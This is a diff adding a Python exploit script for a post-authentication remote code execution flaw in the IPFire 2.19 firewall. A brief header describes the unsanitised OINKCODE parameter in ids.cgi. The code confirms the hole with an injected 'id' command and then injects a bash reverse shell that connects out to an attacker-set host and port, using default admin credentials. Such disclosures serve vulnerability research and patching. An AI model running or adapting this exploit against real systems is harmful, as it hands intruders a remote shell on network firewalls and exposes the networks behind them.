@@ -1,0 +1,45 @@
+# 
+# Title :  IPFire 2.19 Firewall Post-Auth RCE
+# Date : 09/06/2017
+# Author : 0x09AL (https://twitter.com/0x09AL)
+# Tested on: IPFire 2.19 (x86_64) - Core Update 110
+# Vendor : http://www.ipfire.org/
+# Software : http://downloads.ipfire.org/releases/ipfire-2.x/2.19-core110/ipfire-2.19.x86_64-full-core110.iso
+# Vulnerability Description:
+# The file ids.cgi doesn't sanitize the OINKCODE parameter and gets passed to a system call which call wget.
+# You need valid credentials to exploit this vulnerability or you can exploit it through CSRF.
+# 
+#
+
+import requests
+
+
+# Adjust the ip and ports. 
+
+revhost = '192.168.56.1'
+revport = 1337
+url = 'https://192.168.56.102:444/cgi-bin/ids.cgi'
+username = 'admin'
+password = 'admin'
+
+
+payload = 'bash -i >& /dev/tcp/' + revhost + '/' + str(revport) + ' 0>&1'
+evildata = {'ENABLE_SNORT_GREEN':'on','ENABLE_SNORT':'on','RULES':'registered','OINKCODE': '`id`','ACTION': 'Download new ruleset','ACTION2':'snort'}
+headers = {'Accept-Encoding' : 'gzip, deflate, br','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent':'IPFIRE Exploit','Referer': url,'Upgrade-Insecure-Requests':'1'}
+
+
+def verifyVuln():
+	req = requests.post(url,data=evildata,headers=headers,auth=(username,password),verify=False) # Verify false is added because most of the time the certificate is self signed.
+	if(req.status_code == 200 and "uid=99(nobody)" in req.text):
+		print "[+] IPFire Installation is Vulnerable [+]"
+		revShell()
+	else:
+		print "[+] Not Vulnerable [+]"
+
+def revShell():
+	evildata["OINKCODE"] = '`' + payload + '`'
+	print "[+] Sending Malicious Payload [+]"
+	req = requests.post(url,data=evildata,headers=headers,auth=(username,password),verify=False)
+
+	
+verifyVuln()
